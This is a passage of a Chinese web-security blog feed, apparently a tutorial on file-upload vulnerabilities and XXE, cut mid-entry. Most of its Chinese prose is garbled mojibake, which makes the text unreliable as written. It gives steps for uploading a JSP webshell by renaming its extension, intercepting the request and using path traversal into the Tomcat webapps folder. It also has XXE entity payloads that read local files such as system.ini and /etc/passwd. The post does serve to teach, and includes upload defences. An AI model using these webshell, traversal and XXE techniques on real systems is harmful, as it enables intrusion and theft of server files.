class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210424143216004.png" alt="image-20210424143216004"></p><h1 id="ä¸Šä¼ æ¼æ´æ£€æµ‹"><a href="#ä¸Šä¼ æ¼æ´æ£€æµ‹" class="headerlink" title="ä¸Šä¼ æ¼æ´æ£€æµ‹"></a>ä¸Šä¼ æ¼æ´æ£€æµ‹</h1><ol><li>ç™»é™†ç½‘ç«™ï¼Œå¹¶æ‰“å¼€æ–‡ä»¶ä¸Šä¼ é¡µé¢ã€‚</li><li>ç‚¹å‡»â€œæµè§ˆâ€æŒ‰é’®ï¼Œå¹¶é€‰æ‹©æœ¬åœ°çš„ä¸€ä¸ªJSPæ–‡ä»¶(æ¯”å¦‚ hacker.jsp)ï¼Œç¡®è®¤ä¸Šä¼ ã€‚</li><li>å¦‚æœå®¢æˆ·ç«¯è„šæœ¬é™åˆ¶äº†ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹(æ¯”å¦‚å…è®¸gifæ–‡ä»¶)ï¼Œåˆ™æŠŠ hacker.jsp æ›´åä¸º hacker.gifï¼›é…ç½® HTTP Proxy(burp) è¿›è¡Œ http è¯·æ±‚æ‹¦æˆªï¼›é‡æ–°ç‚¹å‡»â€œæµè§ˆâ€æŒ‰é’®ï¼Œå¹¶é€‰æ‹© hacker.giftï¼Œç¡®è®¤ä¸Šä¼ ã€‚</li><li>åœ¨WebScarabæ‹¦æˆªçš„HTTPè¯·æ±‚æ•°æ®ä¸­ï¼Œå°† hacker.gif ä¿®æ”¹ä¸º hacker.jspï¼Œå†å‘é€è¯·æ±‚æ•°æ®ã€‚</li><li>ç™»é™†åå°æœåŠ¡å™¨ï¼Œç”¨å‘½ä»¤<code>find / -name hacker.jsp</code>æŸ¥çœ‹ hacker.jsp æ–‡ä»¶å­˜æ”¾çš„è·¯å¾„ã€‚å¦‚æœå¯ä»¥ç›´æ¥ä»¥Webæ–¹å¼è®¿é—®ï¼Œåˆ™æ„é€ è®¿é—®çš„URLï¼Œå¹¶é€šè¿‡æµè§ˆå™¨è®¿é—® hacker.jspï¼Œå¦‚æœå¯ä»¥æ­£å¸¸è®¿é—®ï¼Œåˆ™å·²ç»å–å¾—WebShellï¼Œæµ‹è¯•ç»“æŸã€‚å¦‚æœ hacker.jsp æ— æ³•é€šè¿‡ web æ–¹å¼è®¿é—®ï¼Œä¾‹å¦‚ hacker.jsp å­˜æ”¾åœ¨ /home/tmp/ ç›®å½•ä¸‹ï¼Œè€Œ /home/tomcat/webapps ç›®å½•å¯¹åº”<a href="http://www.example.com/%EF%BC%8C%E5%88%99%E8%BF%9B%E8%A1%8C%E4%B8%8B%E4%B8%80%E6%AD%A5%E3%80%82">http://www.example.com/ï¼Œåˆ™è¿›è¡Œä¸‹ä¸€æ­¥ã€‚</a></li><li>é‡å¤1ï½3ï¼Œåœ¨burpæ‹¦æˆªçš„HTTPè¯·æ±‚æ•°æ®ä¸­ï¼Œå°†hacker.gifä¿®æ”¹ä¸º../tomcat/webapps/hacker.jspï¼Œå†å‘é€è¯·æ±‚æ•°æ®ã€‚åœ¨æµè§ˆå™¨åœ°å€æ è¾“å…¥<a href="http://www.example.com/hacker.jsp%EF%BC%8C%E8%AE%BF%E9%97%AE%E8%AF%A5%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%8F%96%E5%BE%97WebShell%EF%BC%8C%E7%BB%93%E6%9D%9F%E6%A3%80%E6%B5%8B%E3%80%82">http://www.example.com/hacker.jspï¼Œè®¿é—®è¯¥åé—¨ç¨‹åºï¼Œå–å¾—WebShellï¼Œç»“æŸæ£€æµ‹ã€‚</a></li></ol><h1 id="ä¸Šä¼ æ¼æ´é˜²å¾¡"><a href="#ä¸Šä¼ æ¼æ´é˜²å¾¡" class="headerlink" title="ä¸Šä¼ æ¼æ´é˜²å¾¡"></a>ä¸Šä¼ æ¼æ´é˜²å¾¡</h1><ol><li>æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•è®¾ç½®ä¸ºä¸å¯æ‰§è¡Œ<br>æœ€æœ‰æ•ˆçš„ï¼Œå°†æ–‡ä»¶ä¸Šä¼ ç›®å½•ç›´æ¥è®¾ç½®ä¸ºä¸å¯æ‰§è¡Œï¼Œå¯¹äºLinuxè€Œè¨€ï¼Œæ’¤é”€å…¶ç›®å½•çš„â€™xâ€™æƒé™ï¼›å®é™…ä¸­å¾ˆå¤šå¤§å‹ç½‘ç«™çš„ä¸Šä¼ åº”ç”¨éƒ½ä¼šæ”¾ç½®åœ¨ç‹¬ç«‹çš„å­˜å‚¨ä¸Šä½œä¸ºé™æ€æ–‡ä»¶å¤„ç†ï¼Œä¸€æ˜¯æ–¹ä¾¿ä½¿ç”¨ç¼“å­˜åŠ é€Ÿé™ä½èƒ½è€—ï¼ŒäºŒæ˜¯æœç»äº†è„šæœ¬æ‰§è¡Œçš„å¯èƒ½æ€§ã€‚</li><li>åˆ¤æ–­æ–‡ä»¶ç±»å‹<br>åœ¨åˆ¤æ–­æ–‡ä»¶ç±»å‹æ—¶ï¼Œå¯ä»¥ç»“åˆä½¿ç”¨MIME Typeã€åç¼€æ£€æŸ¥ç­‰æ–¹å¼ã€‚åœ¨æ–‡ä»¶ç±»å‹æ£€æŸ¥ä¸­ï¼Œå¼ºçƒˆæ¨èç™½åå•æ–¹å¼ï¼Œé»‘åå•çš„æ–¹å¼å·²ç»æ— æ•°æ¬¡è¢«è¯æ˜æ˜¯ä¸å¯é çš„ã€‚æ­¤å¤–ï¼Œå¯¹äºå›¾ç‰‡çš„å¤„ç†ï¼Œå¯ä»¥ä½¿ç”¨å‹ç¼©å‡½æ•°æˆ–è€…resizeå‡½æ•°ï¼Œåœ¨å¤„ç†å›¾ç‰‡çš„åŒæ—¶ç ´åå›¾ç‰‡ä¸­å¯èƒ½åŒ…å«çš„HTMLä»£ç ã€‚</li><li>ä½¿ç”¨éšæœºæ•°æ”¹å†™æ–‡ä»¶åå’Œæ–‡ä»¶è·¯å¾„<br>æ–‡ä»¶ä¸Šä¼ å¦‚æœè¦æ‰§è¡Œä»£ç ï¼Œåˆ™éœ€è¦ç”¨æˆ·èƒ½å¤Ÿè®¿é—®åˆ°è¿™ä¸ªæ–‡ä»¶ã€‚åœ¨æŸäº›ç¯å¢ƒä¸­ï¼Œç”¨æˆ·èƒ½ä¸Šä¼ ï¼Œä½†ä¸èƒ½è®¿é—®ã€‚å¦‚æœåº”ç”¨äº†éšæœºæ•°æ”¹å†™äº†æ–‡ä»¶åå’Œè·¯å¾„ï¼Œå°†æå¤§åœ°å¢åŠ æ”»å‡»çš„æˆæœ¬ã€‚å†æ¥å°±æ˜¯åƒshell.php.rar.rarå’Œcrossdomain.xmlè¿™ç§æ–‡ä»¶ï¼Œéƒ½å°†å› ä¸ºé‡å‘½åè€Œæ— æ³•æ”»å‡»ã€‚</li><li>å•ç‹¬è®¾ç½®æ–‡ä»¶æœåŠ¡å™¨çš„åŸŸå<br>ç”±äºæµè§ˆå™¨åŒæºç­–ç•¥çš„å…³ç³»ï¼Œä¸€ç³»åˆ—å®¢æˆ·ç«¯æ”»å‡»å°†å¤±æ•ˆï¼Œæ¯”å¦‚ä¸Šä¼ crossdomain.xmlã€ä¸Šä¼ åŒ…å«Javascriptçš„XSSåˆ©ç”¨ç­‰é—®é¢˜å°†å¾—åˆ°è§£å†³ã€‚</li></ol><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://blog.csdn.net/weixin_39190897/article/details/85334893">Webå®‰å…¨-æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸WAFç»•è¿‡</a></p><p>[2] <a href="https://blog.csdn.net/weixin_44677409/article/details/92799366">upload-labsé€šå…³è®°å½•</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
          <category> æ–‡ä»¶ä¸Šä¼  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXEæ¼æ´å­¦ä¹ </title>
      <link href="posts/19226.html"/>
      <url>posts/19226.html</url>
      
        <content type="html"><![CDATA[<h1 id="XXEç®€ä»‹"><a href="#XXEç®€ä»‹" class="headerlink" title="XXEç®€ä»‹"></a>XXEç®€ä»‹</h1><p>XXE ï¼ˆXML EXternal Entityï¼‰å³XMLå¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»ï¼Œæ˜¯ä¸€ç§å¸¸è§çš„Webå®‰å…¨æ¼æ´ï¼Œå‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡XMLçš„å¤–éƒ¨å®ä½“è·å–æœåŠ¡å™¨ä¸­æœ¬åº”è¢«ä¿æŠ¤çš„æ•°æ®ã€‚å¦‚å½“å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œé€šè¿‡æ„é€ æ¶æ„å†…å®¹ï¼Œå¯å¯¼è‡´è¯»å–ä»»æ„æ–‡ä»¶ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æ¢æµ‹å†…ç½‘ç«¯å£ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚</p><h1 id="XMLåŸºç¡€"><a href="#XMLåŸºç¡€" class="headerlink" title="XMLåŸºç¡€"></a>XMLåŸºç¡€</h1><p>å­¦ä¹ XXEï¼Œå…ˆæ¥äº†è§£ä¸€ä¸‹XMLã€‚</p><p>XMLæ˜¯ä¸€ç§ç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„å¯æ‰©å±•æ ‡è®°è¯­è¨€(Extensible Markup Languageï¼‰ </p><p>XMLæ˜¯ä¸€ç§éå¸¸çµæ´»çš„è¯­è¨€ï¼Œç±»ä¼¼äºHTMLè¯­è¨€ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å›ºå®šçš„æ ‡ç­¾ã€‚æ‰€æœ‰çš„æ ‡ç­¾éƒ½å¯ä»¥è‡ªå®šä¹‰ï¼Œå…¶è®¾è®¡çš„å®—æ—¨æ˜¯ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œè€Œä¸æ˜¯åƒHTMLä¸€æ ·æ˜¾ç¤ºæ•°æ®ã€‚</p><p>XMLä¸ä¼šåšä»»ä½•äº‹æƒ…ï¼Œå®ƒæ˜¯è¢«è®¾è®¡ç”¨æ¥ç»“æ„åŒ–ã€å­˜å‚¨ä»¥åŠä¼ è¾“ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯XMLæ–‡ä»¶æ‰€æºå¸¦çš„ä¿¡æ¯ï¼Œéœ€è¦è¢«å…¶ä»–çš„è¯­è¨€æˆ–è€…ç¨‹åºæ¥è§£æï¼Œæ‰èƒ½å‘æŒ¥ä½œç”¨ã€‚</p><h2 id="XMLè§£æ"><a href="#XMLè§£æ" class="headerlink" title="XMLè§£æ"></a>XMLè§£æ</h2><p>æµç¨‹å›¾</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/U329ff4f7d6a14d788b5e54a8f7ec05e3z.jpg" alt="å›¾ç‰‡"></p><ol><li>ç¨‹åº(Application)æ¥æ”¶åˆ°ç”¨æˆ·ä¼ é€’è¿‡æ¥çš„æ•°æ®ï¼Œç„¶åå°†å…¶äº¤ç»™XML Generator(XMLç”Ÿæˆå™¨)ã€‚</li><li>XML Generator(XMLç”Ÿæˆå™¨)åœ¨æ¥æ”¶åˆ°ç¨‹åºä¼ é€’è¿‡æ¥çš„æ•°æ®å,ä¼šå°†è¿™äº›æ•°æ®è¿›è¡Œä¸€ä¸ªè§„èŒƒåŒ–ï¼Œæœ€ç»ˆç”ŸæˆXMLæ•°æ®ã€‚</li><li>XML Generator(XMLç”Ÿæˆå™¨)åœ¨ç”ŸæˆXMLæ•°æ®åï¼Œç„¶åä¼šç”±æˆ‘ä»¬çš„HTTPå®¢æˆ·ç«¯(HTTP Client)å°†å…¶(XMLæ•°æ®)é€šè¿‡HTTPåè®®ä¼ é€’ç»™æœåŠ¡ç«¯(Web Server)ã€‚</li><li>Web Serveråœ¨æ¥æ”¶åˆ°XMLæ•°æ®ååˆ™ä¼šå°†å…¶äº¤ç»™XML Parser(XMLè§£æå™¨)ã€‚</li><li>XMLè§£æå™¨åˆ™ä¼šå¯¹æ¥æ”¶åˆ°çš„XMLæ•°æ®è¿›è¡Œä¸€ä¸ªè§£æå¤„ç†,ç„¶åå°†ä¿¡æ¯è¿”å›ç»™ç¨‹åº(Application)ï¼Œæœ€ç»ˆå‘ˆç°ç»™ç”¨æˆ·ã€‚</li></ol><h2 id="XMLè¯­æ³•"><a href="#XMLè¯­æ³•" class="headerlink" title="XMLè¯­æ³•"></a>XMLè¯­æ³•</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(1) XML æ–‡æ¡£å¿…é¡»æœ‰ä¸€ä¸ªæ ¹å…ƒç´ </span><br><span class="line">è§£é‡Š:å°±æ˜¯è¯´åœ¨XMLæ–‡æ¡£ä¸­å¿…é¡»æœ‰ä¸€ä¸ªå…ƒç´ æ˜¯å…¶ä»–å…ƒç´ çš„çˆ¶å…ƒç´ (ä¹Ÿå°±æ˜¯è¯´å…¶ä»–å…ƒç´ å¿…é¡»åŒ…å«åœ¨è¿™ä¸ªæ ¹å…ƒç´ ä¸‹).æ ¹å…ƒç´ ä¸å…¶ä»–å…ƒç´ çš„å…³ç³»:çˆ¶å­å…³ç³».</span><br><span class="line"></span><br><span class="line">(2) XML å…ƒç´ éƒ½å¿…é¡»æœ‰ä¸€ä¸ªå…³é—­æ ‡ç­¾</span><br><span class="line">è§£é‡Š:ä¹Ÿå°±æ˜¯è¯´XMLå…ƒç´ å¿…é¡»æœ‰å¤´æœ‰å°¾,ä¸€å¯¹ä¸€å¯¹çš„å‡ºç°.</span><br><span class="line"></span><br><span class="line">(3) XML æ ‡ç­¾å¯¹å¤§å°æ•æ„Ÿ</span><br><span class="line">è§£é‡Š:XMLæ ‡ç­¾çš„å¼€å§‹æ ‡ç­¾å’Œé—­åˆæ ‡ç­¾å¿…é¡»å¤§å°å†™ä¸€è‡´.(ä¸èƒ½ä¸€ä¸ªå¤§å†™ä¸€ä¸ªå°å†™)</span><br><span class="line">å¦‚:&lt;abc&gt;&lt;&#x2F;Abc&gt;       &#x2F;&#x2F;&#x2F;è¿™æ ·å°±æ˜¯é”™è¯¯çš„!</span><br><span class="line"></span><br><span class="line">(4) XML å…ƒç´ å¿…é¡»è¢«æ­£ç¡®çš„åµŒå¥—</span><br><span class="line">è§£é‡Š:XMLå…ƒç´ åœ¨åµŒå¥—ä½¿ç”¨çš„æ—¶å€™,å¿…é¡»æ˜¯ä¸€å¯¹ä¸€å¯¹çš„åµŒå¥—,ä¸èƒ½åªåµŒå¥—ä¸€ä¸ªç»“æŸæ ‡ç­¾æˆ–ä¸€ä¸ªå¼€å§‹æ ‡ç­¾.</span><br><span class="line">å¦‚:&lt;abc&gt;&lt;test&gt;&lt;&#x2F;abc&gt;&lt;&#x2F;test&gt;       &#x2F;&#x2F;è¿™æ ·å°±æ˜¯é”™è¯¯çš„</span><br><span class="line">&lt;abc&gt;&lt;test&gt;&lt;&#x2F;test&gt;&lt;&#x2F;abc&gt;          &#x2F;&#x2F;æ­£ç¡®çš„åµŒå¥—</span><br><span class="line"></span><br><span class="line">(5) XML å±æ€§å€¼å¿…é¡»åŠ å¼•å·</span><br><span class="line">è§£é‡Š:XMLå…ƒç´ åœ¨è®¾ç½®äº†å±æ€§å,å…¶å±æ€§å€¼å¿…é¡»ç”¨å¼•å·åŒ…è£¹.</span><br><span class="line">å¦‚:&lt;abc color&#x3D;blue&gt;               &#x2F;&#x2F;è¿™æ ·æ˜¯é”™è¯¯çš„</span><br></pre></td></tr></table></figure><h2 id="XMLç»“æ„"><a href="#XMLç»“æ„" class="headerlink" title="XMLç»“æ„"></a>XMLç»“æ„</h2><p>XMLç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210407213410158.png" alt="image-20210407213410158"></p><p>XMLå£°æ˜å‘Šè¯‰æµè§ˆå™¨è¿™æ˜¯ä¸€ä¸ªXMLæ–‡æ¡£ã€‚versionå±æ€§æ˜¯å¿…é¡»çš„ï¼Œencondingå±æ€§è¯´æ˜æ–‡æ¡£çš„å­—ç¬¦é›†ç¼–ç ã€‚</p><p>æˆ‘ä»¬å¯ä»¥æŠŠDTDç†è§£ä¸ºä¸€ä¸ªæ¨¡æ¿ï¼Œè¿™ä¸ªæ¨¡æ¿é‡Œé¢å®šä¹‰äº†ç”¨æˆ·è‡ªå·±åˆ›å»ºçš„æ ¹å…ƒç´ ä»¥åŠå¯¹åº”çš„å­å…ƒç´ ã€‚è€Œâ€æ–‡æ¡£å…ƒç´ â€åˆ™å¿…é¡»ä»¥æˆ‘ä»¬çš„DTDä¸ºæ¨¡æ¿ï¼Œæ¥å¯¹XMLçš„å…ƒç´ çš„å†…å®¹è¿›è¡Œç›¸åº”çš„è§„èŒƒåŒ–ã€‚</p><p><strong>PCDATA</strong> çš„æ„æ€æ˜¯è¢«è§£æçš„å­—ç¬¦æ•°æ®ï¼ˆparsed character dataï¼‰ï¼Œæ˜¯ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ï¼Œè¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°ã€‚</p><p><strong>CDATA</strong> æŒ‡çš„æ˜¯ä¸åº”ç”± XML è§£æå™¨è¿›è¡Œè§£æçš„æ–‡æœ¬æ•°æ®ï¼ˆUnparsed Character Dataï¼‰ã€‚åœ¨ XML å…ƒç´ ä¸­ï¼Œâ€&lt;â€ ï¼ˆæ–°å…ƒç´ çš„å¼€å§‹ï¼‰å’Œ â€œ&amp;â€ ï¼ˆå­—ç¬¦å®ä½“çš„å¼€å§‹ï¼‰æ˜¯éæ³•çš„ã€‚è€ŒæŸäº›æ–‡æœ¬ï¼Œæ¯”å¦‚ JavaScript ä»£ç ï¼ŒåŒ…å«å¤§é‡ â€œ&lt;â€ æˆ– â€œ&amp;â€ å­—ç¬¦ã€‚ä¸ºäº†é¿å…é”™è¯¯ï¼Œå¯ä»¥å°†è„šæœ¬ä»£ç å®šä¹‰ä¸º CDATAã€‚CDATA éƒ¨åˆ†ä¸­çš„æ‰€æœ‰å†…å®¹éƒ½ä¼šè¢«è§£æå™¨å¿½ç•¥ã€‚</p><p>ç¤ºä¾‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210408221117818.png" alt="image-20210408221117818"></p><h2 id="XMLå®ä½“"><a href="#XMLå®ä½“" class="headerlink" title="XMLå®ä½“"></a>XMLå®ä½“</h2><p>é™¤äº†åœ¨ DTD ä¸­å®šä¹‰å…ƒç´ ï¼ˆå…¶å®å°±æ˜¯å¯¹åº” XML ä¸­çš„æ ‡ç­¾ï¼‰ä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜èƒ½åœ¨ DTD ä¸­å®šä¹‰å®ä½“(å¯¹åº”XML æ ‡ç­¾ä¸­çš„å†…å®¹)ã€‚å®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ã€‚</p><blockquote><p>ç”¨æˆ·å¯è‡ªå®šä¹‰çš„å®ä½“å¯ä»¥åˆ†ä¸ºä¸€èˆ¬å®ä½“å’Œå‚æ•°å®ä½“</p><ol><li><p>ä¸€èˆ¬å®ä½“çš„å£°æ˜è¯­æ³•ï¼š<!ENTITY å®ä½“å "å®ä½“å†…å®¹"><br>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š&amp;å®ä½“åï¼›</p></li><li><p>å‚æ•°å®ä½“<strong>åªèƒ½åœ¨DTDä¸­ä½¿ç”¨</strong>ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ ¼å¼ï¼š <!ENTITY % å®ä½“å "å®ä½“å†…å®¹"><br>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š%å®ä½“å;</p></li></ol></blockquote><p>ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-string">&quot;hello,world&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">&lt;!--å‚æ•°å®ä½“--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">test</span> <span class="meta-string">&quot;&lt;!ENTITY hello &#x27;hello,world&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%test;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;hello;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>å®ä½“ä»å¼•å…¥æ–¹å¼æ¥çœ‹è¿˜å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼Œå¤–éƒ¨å®ä½“å’Œå†…éƒ¨å®ä½“ã€‚</p><ol><li>å¤–éƒ¨å®ä½“å®šä¹‰éœ€è¦åŠ ä¸Š SYSTEMå…³é”®å­—ï¼Œå…¶å†…å®¹æ˜¯URLæ‰€æŒ‡å‘çš„å¤–éƒ¨æ–‡ä»¶å®é™…çš„å†…å®¹ã€‚</li><li>å¦‚æœä¸åŠ SYSTEMå…³é”®å­—ï¼Œåˆ™ä¸ºå†…éƒ¨å®ä½“ï¼Œè¡¨ç¤ºå®ä½“æŒ‡ä»£å†…å®¹ä¸ºå­—ç¬¦ä¸²ã€‚</li></ol></blockquote><p>ä¸Šé¢æˆ‘ä»¬ä¸¾çš„ä¾‹å­å°±æ˜¯å†…éƒ¨å®ä½“ï¼Œä½†æ˜¯å®ä½“å®é™…ä¸Šå¯ä»¥ä»å¤–éƒ¨çš„ dtd æ–‡ä»¶ä¸­å¼•ç”¨ã€‚</p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///D:/test.dtd&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¤–éƒ¨å®ä½“<code>&amp;xxe;</code>è¡¨ç¤ºçš„å°±æ˜¯å¼•å…¥çš„<code>test.dtd</code>ä¸­çš„å†…å®¹ã€‚</p><p>è¿™æ ·å¯¹å¼•ç”¨èµ„æºæ‰€åšçš„ä»»ä½•æ›´æ”¹éƒ½ä¼šåœ¨æ–‡æ¡£ä¸­è‡ªåŠ¨æ›´æ–°,éå¸¸æ–¹ä¾¿ï¼ˆ<strong>æ–¹ä¾¿æ°¸è¿œæ˜¯å®‰å…¨çš„æ•Œäºº</strong>ï¼‰</p><p>å¼•å…¥å¤–éƒ¨å®ä½“å¯ç”¨çš„ç›¸å…³åè®®ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210112223950560.png"></p><p>æ—¢ç„¶å®ƒèƒ½æŒ‰ç…§è·¯å¾„å¼•å…¥å¤–éƒ¨çš„ <code>dtd </code>æ–‡ä»¶ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯èƒ½å°†è·¯å¾„æ¢ä¸€æ¢ï¼Œæ¢æˆæ•æ„Ÿæ–‡ä»¶çš„è·¯å¾„ï¼Œç„¶åæŠŠæ•æ„Ÿæ–‡ä»¶è¯»å‡ºæ¥ï¼Ÿ</p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span> = &lt;&lt;&lt;EOF</span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///C:/windows/system.ini&quot;</span>&gt; ]&gt; </span><br><span class="line">&lt;test&gt;&amp;xxe;&lt;/test&gt;</span><br><span class="line">EOF;</span><br><span class="line"><span class="variable">$data</span> = simplexml_load_string(<span class="variable">$xml</span>,SimpleXMLElement,LIBXML_NOENT);</span><br><span class="line">print_r(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚å›¾ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210408000828498.png" alt="image-20210408000828498"></p><p>å‡å¦‚ SYSTEM åé¢çš„å†…å®¹å¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼Œé‚£ä¹ˆç”¨æˆ·å°±å¯ä»¥éšæ„æ›¿æ¢ä¸ºå…¶ä»–å†…å®¹ï¼Œä»è€Œè¯»å–æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ï¼ˆfile:///etc/passwd)æˆ–è€…è¿œç¨‹æ–‡ä»¶ï¼ˆ<a href="http://www.baidu.com/abc.txt%EF%BC%89">http://www.baidu.com/abc.txtï¼‰</a></p><h1 id="XXEå‘ç°"><a href="#XXEå‘ç°" class="headerlink" title="XXEå‘ç°"></a>XXEå‘ç°</h1><ol><li><p>é¦–å…ˆå¯»æ‰¾æ¥å—XMLä½œä¸ºè¾“å…¥å†…å®¹çš„æ³¨å…¥ç‚¹ã€‚</p><p>å¯ä»¥é€šè¿‡ä¿®æ”¹HTTPçš„è¯·æ±‚æ–¹æ³•ï¼Œä¿®æ”¹Content-Typeå¤´éƒ¨å­—æ®µç­‰ç­‰æ–¹æ³•ï¼Œç„¶åçœ‹çœ‹åº”ç”¨ç¨‹åºçš„å“åº”ï¼Œçœ‹çœ‹ç¨‹åºæ˜¯å¦è§£æäº†å‘é€çš„xmlå†…å®¹ï¼Œå¦‚æœè§£æäº†, é‚£ä¹ˆåˆ™å¯èƒ½æœ‰XXEæ”»å‡»æ¼æ´ã€‚</p><p>è¿˜å¯ä»¥å°è¯•æ³¨å…¥xmlé¢„å®šä¹‰çš„ä¸€äº›å®ä½“,çœ‹å…¶æ˜¯å¦æŠ¥é”™ï¼Œé€šè¿‡æŠ¥é”™ä¿¡æ¯åˆ¤æ–­ã€‚</p></li><li><p>å¦‚æœç«™ç‚¹è§£æxmlï¼Œå°±å¯ä»¥å°è¯•å¼•ç”¨å®ä½“å’ŒDTD 